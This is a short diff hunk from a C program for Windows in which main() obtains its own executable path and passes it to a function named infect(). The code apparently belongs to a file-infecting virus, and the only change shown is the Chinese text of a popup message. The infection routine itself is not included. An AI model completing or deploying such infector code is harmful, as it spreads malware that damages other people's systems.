@@ -88,7 +88,7 @@ int main()
         char strSelfPath[MAX_PATH] = {0};
         GetModuleFileName(NULL,strSelfPath,MAX_PATH);
         infect(strSelfPath);
-        MessageBoxA(NULL,"????","提示",MB_OK);
+        MessageBoxA(NULL,"这是zc的代码~~~，一定要修改注意安全哦","提示",MB_OK);
         clock_t t1 = clock();
         clock_t t2 = clock();
         while(1)
